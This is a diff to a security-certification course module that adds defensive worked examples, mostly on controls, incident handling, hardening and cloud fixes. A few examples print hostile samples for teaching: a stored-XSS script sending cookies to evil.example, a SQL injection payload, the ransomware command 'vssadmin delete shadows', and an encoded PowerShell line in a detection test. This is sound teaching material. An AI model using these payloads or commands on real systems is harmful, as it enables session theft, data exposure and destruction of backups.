@@ -140,6 +140,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Map one control across frameworks',
+        code: 'Need: multi-factor authentication for remote access\n\nNIST CSF 2.0     PR.AA  (Identity Management, Authentication and Access Control)\nISO/IEC 27001    Annex A 5.17 Authentication information, 8.5 Secure authentication\nCIS Controls v8  6.4 Require MFA for remote network access\nPCI DSS v4.0     8.4.3 MFA for remote network access',
+        explanation: 'One well-documented control can satisfy several frameworks at once. A mapping like this stops teams building the same control four times for four audits.',
+      },
+    ],
     cheatSheet: [
       ['ATT&CK tactic vs technique', 'Goal (why) vs method (how)'],
       ['Initial Access', 'First foothold: phishing, public apps, valid accounts'],
@@ -182,6 +189,13 @@ export default {
           'SPF lists which servers may send for a domain, DKIM signs the message so tampering is detectable, and DMARC checks that those results align with the visible From address and tells receivers what to do on failure (none, quarantine, reject).',
           'A sandbox is an isolated environment where you run a suspicious file and watch its behaviour: files dropped, registry keys changed, network calls made. A hash lookup on a service such as VirusTotal tells you whether that exact file is known to be malicious, but changing a single byte changes the hash, so "no results" proves very little.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Tier 1 alert note',
+        code: 'Alert:     Impossible travel - j.smith (Lisbon 08:02, Singapore 08:40)\nChecked:   Singapore IP = commercial VPN exit node; no MFA prompt logged\n           j.smith\'s laptop shows Lisbon office Wi-Fi at 08:40\nVerdict:   Likely token theft (session reuse without MFA)\nAction:    Revoked sessions, reset password, escalated to Tier 2 (P2)\nTicket:    INC-48213',
+        explanation: 'A good note records what was checked, the verdict and the action, so the next analyst can continue without redoing the work.',
       },
     ],
     cheatSheet: [
@@ -231,6 +245,13 @@ export default {
           'Security Misconfiguration covers insecure defaults, verbose error messages, open storage and unneeded features; harden with baselines and automated configuration scanning. Insecure deserialization, turning untrusted serialized data into objects, can lead to code execution; the 2021 list groups it under Software and Data Integrity Failures.',
           'Burp Suite (the Community edition is free) is the standard intercepting proxy for web testing; OWASP ZAP is a fully free alternative. Practise only on labs and applications you are authorised to test.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'SQL injection and the fix',
+        code: '# Vulnerable: input is pasted into the query text\nq = "SELECT * FROM users WHERE name = \'" + name + "\'"\n# name = "\' OR \'1\'=\'1"  ->  returns every user\n\n# Fixed: parameterised query; input is only ever data\ncur.execute("SELECT * FROM users WHERE name = %s", (name,))',
+        explanation: 'Escaping and blocklists are fragile. Parameterised queries separate code from data, so no input can change the query\'s structure.',
       },
     ],
     cheatSheet: [
@@ -419,6 +440,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Order of volatility in practice',
+        code: '1. CPU registers, cache        (gone in nanoseconds - rarely captured)\n2. Memory, network connections (winpmem / netstat -ano)\n3. Running processes           (EDR process tree)\n4. Disk                        (forensic image via write-blocker)\n5. Remote logs                 (SIEM, firewall)\n6. Backups and archives',
+        explanation: 'Collect the most volatile evidence first. Pulling the power cord before capturing memory destroys running malware, keys and network state.',
+      },
+    ],
     cheatSheet: [
       ['Memory image first', 'RAM: processes, connections, keys, fileless malware'],
       ['WinPmem / LiME / Volatility', 'Capture Windows / Linux RAM / analyse'],
@@ -466,6 +494,13 @@ export default {
           'Common cloud initial access comes from leaked access keys (often in code repositories) and misconfigured public storage: scan repos for secrets and block public buckets by default. An illicit OAuth consent grant tricks a user into approving a malicious app\'s access to their data; restrict user consent and review app permissions regularly.',
           'The cloud control plane (the IAM and API layer) is critical, because whoever controls it controls every resource. Protect root and global admin accounts with strong MFA, alerting and break-glass procedures. Token theft steals session or refresh tokens to act as the user without the password or MFA; short token lifetimes, token binding and conditional access limit it.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Spotting Kerberoasting',
+        code: 'Event 4769 (Kerberos service ticket requested)\n  Account:        jdoe\n  Service:        MSSQLSvc/sql01.corp.local:1433\n  Ticket enc:     0x17 (RC4-HMAC)\n  ...repeated for 46 different service accounts in 2 minutes',
+        explanation: 'One user requesting RC4 tickets for dozens of SPNs is a classic Kerberoasting pattern: the tickets are cracked offline. Defend with long gMSA passwords and AES-only encryption.',
       },
     ],
     cheatSheet: [
@@ -537,6 +572,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'From IOC to TTP',
+        code: 'Pyramid of Pain\nHash values     d41d8cd9...        trivial for attacker to change\nIP addresses    185.220.101.4      easy\nDomain names    upd-check[.]net    simple\nArtifacts       Run key \'Updater\'  annoying\nTools           Cobalt Strike      challenging\nTTPs            T1003.001 LSASS    tough - forces new tradecraft',
+        explanation: 'Blocking a hash costs the attacker a recompile; detecting LSASS memory access costs them their method. Prioritise intel you can turn into behavioural detections.',
+      },
+    ],
     cheatSheet: [
       ['Strategic / operational / tactical', 'Leaders / campaigns / TTPs and IoCs'],
       ['Lifecycle', 'Direction, collection, processing, analysis, dissemination, feedback'],
@@ -569,7 +611,7 @@ export default {
         body: [
           'At the victim, a volumetric flood shows high requests per second over reused connections; slowloris shows concurrency climbing while requests never complete. A connection flood opens a fresh socket per request (connections roughly equal requests), whereas a volumetric flood reuses keep-alive connections (requests far exceed connections).',
           'The rapid-reset vector models CVE-2023-44487: streams initiated far exceed streams completed, and connections open and then abort or reset almost immediately.',
-          'The amplification lab measures each protocol\'s amplification factor without attacking anyone, because it never spoofs a source IP: the large responses return to the sender. NTP `monlist` has the highest factor of its profiles (about 556x), answering from UDP source port 123.',
+          'The amplification lab measures each protocol\'s amplification factor without attacking anyone, because it never spoofs a source IP: the large responses return to the sender. NTP `monlist` amplifies about 556x, answering from UDP source port 123; memcached over UDP 11211 is far higher (CISA lists 10,000x to 51,000x), which is why exposed memcached servers were behind record-breaking floods.',
         ],
       },
       {
@@ -586,6 +628,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'A detection-as-code test',
+        code: 'rule: encoded_powershell\ntest:\n  given:  process.command_line = "powershell.exe -nop -enc SQBFAFgA"\n  expect: alert\n  given:  process.command_line = "powershell.exe -File backup.ps1"\n  expect: no_alert',
+        explanation: 'Each rule ships with a malicious and a benign sample, so a change that breaks detection or floods analysts with false positives fails in CI, not in production.',
+      },
+    ],
     cheatSheet: [
       ['T1110 credential stuffing', '401 burst, many usernames, one source'],
       ['T1595 enumeration', '404 spike, many distinct paths'],
@@ -595,6 +644,7 @@ export default {
       ['connflood', 'Connections ≈ requests'],
       ['Rapid reset', 'CVE-2023-44487: opened ≫ completed'],
       ['NTP monlist', '~556x, UDP source port 123'],
+      ['memcached reflection', '10,000x+, UDP 11211'],
       ['T1036 masquerading', 'Double or mismatched extension'],
       ['T1547.001 / T1053.005', 'Run key (Sysmon 12/13) / task (4698)'],
       ['T1071 beacon', 'Periodicity, not volume'],
@@ -622,6 +672,20 @@ export default {
           'Business email compromise rarely carries malware at all: a spoofed or hijacked executive account directs a wire transfer or invoice change purely on trust, which is why finance teams need their own training. Pretexting invents a scenario to extract information, baiting dangles something tempting (the parking-lot USB drop), and tailgating follows an authorized person through a secured door.',
           'Watering hole attacks compromise websites the targets already visit instead of attacking them directly. Typosquatting registers lookalike domains for credential harvesting. Influence campaigns coordinate disinformation through fake personas. Clone phishing copies a real email and swaps in malicious links, while pharming poisons DNS so even correctly typed URLs land on the attacker\u2019s copy. The defence against all of it is process and culture: verify out of band.',
         ],
+      },
+      {
+        heading: 'Turning actor knowledge into defence',
+        body: [
+          'Knowing who might attack you is only useful if it changes what you do. Start with the actors realistically interested in your organisation and look up the techniques they are known to use; MITRE ATT&CK groups and vendor threat reports list them. Then check whether your logging would see those techniques and whether your controls would stop them. That gap list is a far better security roadmap than a generic top-ten.',
+          'Capability and motive also set expectations for incident response. A financially motivated ransomware crew wants a quick payout and will move from access to encryption in days. A state-sponsored group may stay hidden for months, so finding one implant should start a hunt for others rather than end with re-imaging one machine.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Profile an actor for your organisation',
+        code: 'Actor type       Motive          Typical target        Relevance to a regional hospital\n---------------  --------------  --------------------  --------------------------------\nRansomware crew  Money           Anyone who will pay   High\nNation state     Espionage       Research, government  Medium (clinical trial data)\nHacktivist       Ideology        Public-facing sites   Low-Medium\nInsider          Money/grievance Own employer          Medium',
+        explanation: 'Threat modelling starts with who is likely to come for you and why; that, not headlines, decides where the budget goes.',
       },
     ],
     cheatSheet: [
@@ -660,6 +724,20 @@ export default {
           'Botnets network compromised machines for DDoS, spam, and cryptojacking — the theft of compute for mining cryptocurrency, betrayed by unexplained CPU spikes. Wipers destroy data with no recovery option (NotPetya posed as ransomware but was a wiper), and ransomware-as-a-service lets criminals lease attack kits to affiliates, lowering the skill barrier for everyone.',
         ],
       },
+      {
+        heading: 'Defending against malware in layers',
+        body: [
+          'No single control stops malware, so defences cover each stage. Before execution: email filtering, blocking macros from the internet, application allowlisting, and patching browsers and document readers. During execution: EDR that watches behaviour such as Office spawning PowerShell or mass file renames, and attack surface reduction rules. After execution: network egress filtering to break command and control, and least privilege so a compromised user cannot reach everything.',
+          'Recovery is part of the defence. Offline or immutable backups that are tested regularly turn ransomware from an existential event into an expensive one. Combine that with an incident plan that says who isolates hosts and who decides on rebuilds, and the organisation can respond in hours instead of improvising for days.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Static triage of a sample',
+        code: '$ sha256sum invoice.exe\n7a1c...9e3f  invoice.exe          -> look up on VirusTotal\n$ file invoice.exe\nPE32 executable (GUI) Intel 80386  -> Windows binary despite \'invoice\'\n$ strings -n 8 invoice.exe | grep -Ei \'http|\\.onion|vssadmin\'\nvssadmin delete shadows /all /quiet  -> ransomware behaviour',
+        explanation: 'Hashing, file type and strings take a minute and need no execution. Deleting shadow copies is a strong ransomware indicator. Run anything further only in an isolated sandbox.',
+      },
     ],
     cheatSheet: [
       ['Ransomware', 'Encrypts data, demands payment'],
@@ -697,6 +775,20 @@ export default {
           'Least privilege grants only the access a task needs, limiting any compromise\u2019s blast radius. Defence in depth layers controls so no single failure is fatal. Attack surface reduction removes what attackers could target in the first place. And "security through obscurity" — hiding details — fails the moment it is discovered, so use it only as one layer among many, per Kerckhoffs\u2019s principle.',
         ],
       },
+      {
+        heading: 'Finding vulnerabilities before attackers do',
+        body: [
+          'Different techniques find different flaws. Static analysis (SAST) reads source code for patterns such as unsanitised input reaching a query. Dynamic testing (DAST) attacks the running application from outside. Software composition analysis checks third-party libraries against known CVEs, which matters because most application code today is open-source dependencies. Fuzzing feeds malformed input to find crashes that often signal memory-safety bugs.',
+          'None of these replaces design review. Threat modelling, for example with STRIDE, asks what could go wrong before code exists and catches whole classes of problems, such as a missing authorisation check on an API, that scanners struggle to see. Use the cheap automated checks on every commit and save manual review and penetration testing for the highest-risk components.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Read a CVSS v3.1 vector',
+        code: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   = 9.8 Critical\n\nAV:N  attack over the network\nAC:L  no special conditions\nPR:N  no account needed\nUI:N  no user interaction\nC/I/A:H  full compromise',
+        explanation: 'The vector tells you why it is critical: an unauthenticated network attacker gets full control. CVSS v4.0 is now published; read its vectors the same way, with added supplemental metrics.',
+      },
     ],
     cheatSheet: [
       ['Zero-day', 'Exploited before vendor knows/patches'],
@@ -732,6 +824,20 @@ export default {
           'Harden with golden images (approved templates), immutable infrastructure (replace rather than patch), infrastructure-as-code scanning, and runtime-injected secrets — never baked into images. Zero trust ("never trust, always verify") replaces flat VPN-era networking with per-request, identity-aware access; microsegmentation and service meshes (mutual TLS between services) are its network expression.',
         ],
       },
+      {
+        heading: 'Common cloud misconfigurations',
+        body: [
+          'Most cloud breaches come from configuration, not from attacks on the provider. The recurring mistakes are storage buckets or blobs left public, overly broad IAM permissions such as wildcard actions or unused admin roles, long-lived access keys committed to code, security groups open to 0.0.0.0/0 on management ports, and logging that was never enabled, so there is no record when something goes wrong.',
+          'The fixes are mostly guardrails rather than heroics: block public access at the account level, enforce least privilege with policies reviewed by tools such as IAM Access Analyzer, use roles and short-lived credentials instead of keys, scan infrastructure-as-code before deployment, and run continuous posture checks (CSPM) that alert when a resource drifts from the baseline.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Shared responsibility for one workload',
+        code: 'Workload: web app on IaaS VMs\nProvider:  physical data centre, hosts, hypervisor, network fabric\nCustomer:  guest OS patching, firewall rules, IAM, app code, data, encryption keys\n\nSame app on a managed PaaS service:\nProvider adds: OS and runtime patching\nCustomer keeps: IAM, app code, data, configuration',
+        explanation: 'Moving up the stack hands more layers to the provider, but identity, data and configuration always stay with the customer; most cloud breaches happen there.',
+      },
     ],
     cheatSheet: [
       ['IaaS / PaaS / SaaS', 'You manage OS / code / data+access'],
@@ -766,6 +872,20 @@ export default {
           'Stateful firewalls track connections rather than judging packets alone, and zone policies default-deny between trust zones. A WAF filters HTTP-layer attacks in front of web apps, an IDS only alerts while an IPS blocks inline (tune in IDS mode first to avoid false-positive outages), and reverse proxies terminate client connections so origin servers stay hidden.',
         ],
       },
+      {
+        heading: 'Verifying that segmentation works',
+        body: [
+          'A segmentation diagram is a claim; testing turns it into evidence. From a host in each zone, try to reach the services that the design says must be blocked, for example the database port from the user VLAN, and confirm the connection fails and the firewall logs the denial. Tools such as nmap from inside each segment, or automated breach-and-attack simulation, make this repeatable.',
+          'Re-test after changes. Rules accumulate over time: a temporary \'any-any\' added for a migration, an over-broad object group, a forgotten VPN route. A regular rule review that removes unused and shadowed rules, combined with change control that requires a business owner for each rule, keeps the segmentation the design intended.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Three-tier segmentation rules',
+        code: 'Zone      Allowed inbound from     Ports\n--------  -----------------------  ---------\nDMZ/web   Internet                 443\nApp       Web tier only            8443\nDB        App tier only            5432\nMgmt      Admin jump host only     22, 3389\nDefault   deny all, log denies',
+        explanation: 'Each tier talks only to its neighbour, so a compromised web server cannot reach the database directly. The default deny and logging make lateral movement visible.',
+      },
     ],
     cheatSheet: [
       ['DMZ', 'Buffer net; firewalled both sides'],
@@ -799,6 +919,20 @@ export default {
           'Split-tunnel VPNs send only corporate traffic through the tunnel (faster) while full-tunnel sends everything (inspectable and controlled). Site-to-site VPNs link networks; remote-access VPNs link roaming users. Always-on VPN connects before user logon so policy and patching apply off-network.',
           'WPA3 replaces WPA2\u2019s crackable handshakes with SAE, which resists offline dictionary attacks; WPA2-Enterprise adds per-user 802.1X authentication via RADIUS instead of one shared PSK. Rogue access points and evil twins (fake APs cloning a real SSID) are countered with wireless intrusion prevention and wired-side NAC. Deauthentication attacks spoof disconnect frames to capture handshakes — 802.11w protected management frames mitigate them. Bluetooth and NFC bring close-range risks (pairing interception, relay attacks); keep discoverable mode off.',
         ],
+      },
+      {
+        heading: 'Checking a TLS configuration',
+        body: [
+          'Good protocol choice is easy to undermine with weak settings, so test what a server actually offers. `openssl s_client -connect host:443 -tls1_1` should fail on a modern server, and tools such as testssl.sh or the Qualys SSL Labs test list supported protocol versions, cipher suites, certificate chain problems and missing HSTS.',
+          'A sound baseline today is TLS 1.2 and 1.3 only, forward-secret key exchange (ECDHE), AEAD ciphers such as AES-GCM or ChaCha20-Poly1305, a complete certificate chain, certificates renewed automatically before expiry, and HSTS on web services. Disable older protocols such as SSL 3.0, TLS 1.0 and 1.1 everywhere, including on internal services that are easy to forget.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Insecure protocol replacements',
+        code: 'Insecure   Port   Replace with        Port\n---------  -----  ------------------  -----\nTelnet     23     SSH                 22\nFTP        21     SFTP / FTPS         22 / 990\nHTTP       80     HTTPS (TLS 1.2+)    443\nLDAP       389    LDAPS               636\nSNMPv1/2c  161    SNMPv3 (authPriv)   161\nPOP3/IMAP  110/143 POP3S/IMAPS       995/993',
+        explanation: 'The legacy protocols send credentials in clear text. Their secure versions add encryption and authentication, usually on a different port.',
       },
     ],
     cheatSheet: [
@@ -844,6 +978,13 @@ export default {
           'Keys need homes and lifecycles. A hardware security module (HSM) is a network-attached vault serving keys to many systems; a TPM is a chip binding keys to one motherboard. Rotate keys on schedule and immediately on suspected compromise, and never hard-code them into shipped software — anyone who downloads the app owns the key.',
           'Elliptic-curve crypto gives more strength per bit than RSA: a 256-bit curve rivals RSA-3072, which is why ECC dominates on phones and constrained devices. And when secrecy must also hide the message’s very existence, steganography tucks data inside innocent files — but unlike encryption, it provides no mathematical guarantee once discovered.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Hashing vs encryption vs signing',
+        code: '$ echo -n \'hello\' | sha256sum\n2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824   (one-way)\n\n$ openssl enc -aes-256-gcm ...          # reversible with the key (confidentiality)\n$ openssl dgst -sha256 -sign key.pem file  # private key signs, public key verifies (integrity + origin)',
+        explanation: 'Hashing proves content has not changed, encryption hides it, and a signature proves who produced it. Passwords are stored with slow salted hashes (Argon2id, bcrypt), never encrypted.',
       },
     ],
     cheatSheet: [
@@ -900,6 +1041,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Defence in depth around one asset',
+        code: 'Asset: customer database\nPolicy     data classification, access reviews\nPhysical   badge-controlled data centre\nPerimeter  firewall, WAF\nNetwork    DB in isolated subnet\nHost       hardened OS, EDR\nApp        parameterised queries, least-privilege DB user\nData       encryption at rest, column masking',
+        explanation: 'No single layer is perfect; an attacker who bypasses the WAF still meets least privilege and encryption.',
+      },
+    ],
     cheatSheet: [
       ['Ransomware encrypting files', 'Availability (+ confidentiality if stolen)'],
       ['Wrong balances, no outage', 'Integrity'],
@@ -945,6 +1093,13 @@ export default {
           'Test realism in stages: tabletops talk through a scenario, functional exercises actually fail systems over, full-interruption tests run the business from the alternate site. Escalate gradually, because the most realistic tests risk real disruption. Test generators under load monthly — an untested generator is a hope, not a control.',
           'Continuity lives or dies on communication: who contacts whom, over which out-of-band channels, with pre-drafted messages for staff, customers, regulators, and media. Rehearse call trees — people change numbers, and a drill finds the dead branches before 2 a.m. does.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Qualitative risk register entry',
+        code: 'Risk ID:     R-014\nScenario:    Ransomware encrypts file servers via phishing\nLikelihood:  Likely (4/5)\nImpact:      Major (4/5)          -> Inherent risk 16 (High)\nControls:    EDR, offline backups, phishing training\nResidual:    Possible (3) x Moderate (3) = 9 (Medium)\nTreatment:   Mitigate; owner CIO; review quarterly',
+        explanation: 'The register records inherent risk, the controls and the residual risk, with an owner. Management then decides whether the residual is within appetite.',
       },
     ],
     cheatSheet: [
@@ -1026,6 +1181,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Policy, standard, procedure, guideline',
+        code: 'Policy      \'All remote access must use MFA.\'              (mandatory, high level)\nStandard    \'MFA must be FIDO2 or authenticator app.\'      (mandatory, specific)\nProcedure   \'1. Open portal  2. Enrol key  3. Test ...\'   (mandatory steps)\nGuideline   \'Keep a backup key in a safe place.\'           (recommended)',
+        explanation: 'Policies state intent and are approved by leadership; standards and procedures make them measurable; guidelines are advice.',
+      },
+    ],
     cheatSheet: [
       ['HIPAA', 'PHI; 60-day breach notice'],
       ['SOX 404', 'Controlled IT for financial reporting'],
@@ -1077,6 +1239,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Work a scenario question',
+        code: 'Scenario: Users report pop-ups; EDR shows many hosts\n          contacting one new domain every 5 minutes.\n\nStep 1  What is happening?   Beaconing -> likely C2\nStep 2  What is asked?       \'BEST first action\'\nStep 3  Eliminate:           re-image all (too early), ignore (wrong)\nStep 4  Answer:              block the domain and isolate affected hosts',
+        explanation: 'Identify the attack, then read exactly what the question asks: first, best or most likely. Containment usually comes before eradication.',
+      },
+    ],
     cheatSheet: [
       ['Triage order', 'Contain → investigate → recover'],
       ['Impossible travel', 'Two places at once = compromise until proven otherwise'],
@@ -1122,6 +1291,13 @@ export default {
           'Unknown assets are unpatched assets. Discovery must be continuous and reconciled against the CMDB, because scans only see what they are pointed at. Decommissioned servers still powered on and domain-joined are attacker infrastructure waiting to happen — isolate, verify dependencies, then wipe and remove properly.',
           'Answer “are we getting safer?” with outcomes: mean time to remediate for exposed criticals, exception aging, repeat findings. Closed-ticket counts reward closing easy findings; the board needs to know how fast the dangerous ones die.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Hardening a new Linux server',
+        code: 'apt update && apt upgrade -y                 # patch\nsystemctl disable --now telnet.socket cups   # remove unneeded services\nsed -i \'s/^#*PermitRootLogin.*/PermitRootLogin no/\' /etc/ssh/sshd_config\nsed -i \'s/^#*PasswordAuthentication.*/PasswordAuthentication no/\' /etc/ssh/sshd_config\nufw default deny incoming && ufw allow 22/tcp && ufw enable\nsystemctl restart ssh',
+        explanation: 'Patch, remove what you do not need, require keys instead of passwords and default-deny the firewall. CIS Benchmarks give a full checklist.',
       },
     ],
     cheatSheet: [
@@ -1171,6 +1347,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Which tool answers which question?',
+        code: 'Question                                    Tool\n------------------------------------------  ---------------------\nWhat ports are open on this host?           nmap -sV 10.0.0.5\nWhat is crossing the wire?                  tcpdump / Wireshark\nWhich known CVEs affect these hosts?        Vulnerability scanner\nWhat happened across all systems at 02:00?  SIEM search\nIs this file malicious?                     Sandbox / hash lookup',
+        explanation: 'Exam scenarios often describe the question and expect you to name the tool. Match the need to the data source.',
+      },
+    ],
     cheatSheet: [
       ['EDR tamper + log clear', 'Isolate — tradecraft, not a glitch'],
       ['LOLBins', 'Judge parent-child + location + egress, not the binary'],
@@ -1216,6 +1399,13 @@ export default {
           'External communication runs through legal with a holding statement: acknowledge the investigation promptly, never deny what you have not verified. Breach notification clocks start at discovery and do not wait for a complete investigation.',
           'Lessons learned is a phase, not a meeting: blameless by rule, focused on systems not people, and every recommendation gets an owner, a deadline, and a verification check. The same vector succeeding twice means the review failed — track it.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'NIST incident response phases on one case',
+        code: 'Preparation        EDR deployed, IR plan, contact list\nDetection/Analysis SIEM alert: mass file renames on FS01\nContainment        isolate FS01, disable compromised account\nEradication        remove malware, close the RDP exposure\nRecovery           restore from offline backup, monitor\nLessons learned    MFA on RDP; update playbook',
+        explanation: 'SP 800-61r3 now maps these activities to the CSF 2.0 functions, but the order of work in an incident is the same.',
       },
     ],
     cheatSheet: [
@@ -1267,6 +1457,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Name the attack from its signs',
+        code: 'Signs                                               Attack\n--------------------------------------------------  ----------------------\nMany accounts, one common password each             Password spraying\nBreached user/pass pairs tried on our site          Credential stuffing\nVisitor tailgates through a badge door              Piggybacking/tailgating\nLegit site of a target industry is compromised      Watering hole\nSMS asking to \'verify your bank account\'            Smishing',
+        explanation: 'Most scenario questions describe symptoms. Learn the distinguishing sign of each attack, such as one password across many accounts for spraying.',
+      },
+    ],
     cheatSheet: [
       ['Attribution signals', 'Dwell time + tooling + objectives'],
       ['APT vs ransomware', 'Slow quiet theft vs loud fast extortion'],
@@ -1312,6 +1509,13 @@ export default {
           'Reinfection means the vector is still alive: a shared USB with an autorun payload, a trojanized installer still in use. Clean the vector before the hosts — mopping with the tap running just floods again. And time your defenses to adversary timing: holiday-weekend attacks assume skeleton crews.',
           'Unpatchable and unmanaged devices (IoT cameras, legacy terminals) become attacker infrastructure: when firmware can’t be fixed, segmentation is the compensating control. Isolate them on dedicated VLANs with only required traffic allowed.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Malware types by behaviour',
+        code: 'Behaviour                                         Type\n------------------------------------------------  -----------\nSpreads by itself across the network              Worm\nLooks like a useful app, hides a payload          Trojan\nEncrypts files, demands payment                   Ransomware\nRuns only when a condition (date, event) is met   Logic bomb\nHides itself and gives persistent admin access    Rootkit\nRecords keystrokes                                Keylogger',
+        explanation: 'Self-propagation without user action is the key difference between a worm and a virus.',
       },
     ],
     cheatSheet: [
@@ -1361,6 +1565,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Stored XSS and its fix',
+        code: 'Comment saved:  <script>fetch(\'//evil.example/c?\'+document.cookie)</script>\nEvery visitor\'s browser runs it and sends their cookie.\n\nFixes:\n- Encode output: &lt;script&gt; is shown, not run\n- Content-Security-Policy: script-src \'self\'\n- Session cookie flags: HttpOnly; Secure; SameSite=Lax',
+        explanation: 'Stored XSS runs for everyone who views the page. Output encoding is the primary fix; CSP and HttpOnly limit the damage if one slips through.',
+      },
+    ],
     cheatSheet: [
       ['Spear/whaling', 'Verify via trusted channel, never the message'],
       ['Pretexting', 'Public facts ≠ authentication'],
@@ -1406,6 +1617,13 @@ export default {
           'Risk acceptance is a decision with paperwork and an expiry: written, signed at the right authority level, with compensating controls and a review date. Silent ignoring is not acceptance — it’s negligence with better branding.',
           'Measure outcomes, not activity: mean time to remediate for exposed criticals, exception aging, repeat findings. When closed-ticket counts look great while MTTR climbs, the program is optimizing easy wins — re-anchor leadership reporting on risk-weighted metrics.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Validate a scanner finding',
+        code: 'Scanner: \'Apache 2.4.49 path traversal (CVE-2021-41773)\' on 10.0.3.7\nCheck:   curl -sI http://10.0.3.7 | grep Server\n         Server: nginx/1.24.0\nResult:  false positive (wrong product); document and tune the plugin',
+        explanation: 'Verify before you escalate. Recording false positives and why stops the same finding consuming time every month.',
       },
     ],
     cheatSheet: [
@@ -1455,6 +1673,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Fix a public S3 bucket',
+        code: 'aws s3api put-public-access-block --bucket reports-prod \\\n  --public-access-block-configuration \\\n  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\naws s3api get-bucket-policy-status --bucket reports-prod\n  { "PolicyStatus": { "IsPublic": false } }',
+        explanation: 'Block Public Access overrides ACLs and policies that would expose the bucket. New buckets have it on by default; enable it at the account level too.',
+      },
+    ],
     cheatSheet: [
       ['Shared responsibility', 'Provider: platform; you: config, identity, data'],
       ['#1 cloud breach cause', 'Misconfiguration, not zero-days'],
@@ -1500,6 +1725,13 @@ export default {
           'Wireless is a physical-layer promise: WPA2-PSK shared across 200 people has no attribution and brutal rotation. Enterprise 802.1X with per-user credentials fixes both — and rogue APs get found by WIDS, not by luck.',
           'Inspect where it matters: IDS in detect-first mode before inline blocking, packet capture or flow data at the edge, DNS forced through your resolvers. Firewall logs are the bouncer’s diary; forensics needs the actual traffic.',
         ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Place the controls in a network',
+        code: 'Internet -> [Edge firewall] -> DMZ: [WAF] -> web servers\n                           -> [Internal firewall] -> App VLAN -> DB VLAN\nInline IPS between edge and DMZ (blocks)\nIDS on a SPAN port in the DB VLAN (alerts only)\nNAC on access switches (802.1X)',
+        explanation: 'Inline devices (firewall, IPS, WAF) can block; out-of-band sensors (IDS) only see copies. NAC decides who gets on the network at all.',
       },
     ],
     cheatSheet: [
@@ -1549,6 +1781,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Choose a data protection method',
+        code: 'Need                                         Method\n-------------------------------------------  ----------------------\nAnalysts need trends, not identities         Anonymisation / aggregation\nSupport sees only the last 4 card digits     Masking\nOrder system must not store card numbers     Tokenisation\nLaptop may be stolen                         Full-disk encryption\nFiles leaving by email must be caught        DLP',
+        explanation: 'Pick the method by the use case: masking hides data on display, tokenisation removes it from a system, encryption protects it where it is stored.',
+      },
+    ],
     cheatSheet: [
       ['No classification', 'Controls are guesswork'],
       ['PII in logs to vendor', 'Mask/tokenize at the boundary'],
@@ -1596,6 +1835,13 @@ export default {
         ],
       },
     ],
+    examples: [
+      {
+        title: 'Backup types and restore steps',
+        code: 'Sun full, Mon-Sat backups, failure on Thursday\n\nIncremental: restore Sun full + Mon + Tue + Wed   (4 sets, fastest backups)\nDifferential: restore Sun full + Wed              (2 sets, faster restore)\n\n3-2-1: 3 copies, 2 media types, 1 offsite (keep one copy offline/immutable)',
+        explanation: 'Incrementals copy changes since the last backup of any kind; differentials copy changes since the last full. The trade-off is backup time against restore time.',
+      },
+    ],
     cheatSheet: [
       ['3-2-1', '3 copies, 2 media, 1 offsite'],
       ['Ransomware + backups', 'Immutable/offline copies only'],
@@ -1637,6 +1883,20 @@ export default {
           'Separation of duties, mandatory vacations, dual control, and job rotation are detective and preventive controls against fraud and single-person dependency.',
           'Physical controls fail at the weakest door: badge readers mean nothing beside a propped side door. Every entry is the perimeter.',
         ],
+      },
+      {
+        heading: 'Reading a concepts scenario',
+        body: [
+          'Concept questions in scenario form usually hide the principle behind a business story. A hospital wants doctors to see records only while treating a patient: that is least privilege with context, often attribute-based access control. A payment needs two people to approve: separation of duties. A guard checks badges and a camera records the door: a preventive control backed by a detective one.',
+          'Work out which principle the story is testing before reading the options. Then eliminate answers that are true statements but solve a different problem. When two options both fit, prefer the one that addresses the root cause, such as removing standing access, over one that only detects misuse afterwards.',
+        ],
+      },
+    ],
+    examples: [
+      {
+        title: 'Zero trust access decision',
+        code: 'Request: contractor laptop -> HR app\nPolicy engine checks:\n  identity      MFA-verified, contractor role\n  device        managed? NO\n  location      unusual country\n  resource      HR app = sensitive\nDecision (policy enforcement point): deny; offer VDI access instead',
+        explanation: 'Zero trust evaluates every request on identity, device posture and context, not on whether the user is \'inside\' the network.',
       },
     ],
     cheatSheet: [
@@ -1681,6 +1941,20 @@ export default {
           'Crypto agility — knowing where each algorithm is used and being able to swap — is the defensible answer to quantum and to the next broken cipher. Inventory first, panic never.',
         ],
       },
+      {
+        heading: 'Common cryptography traps in scenarios',
+        body: [
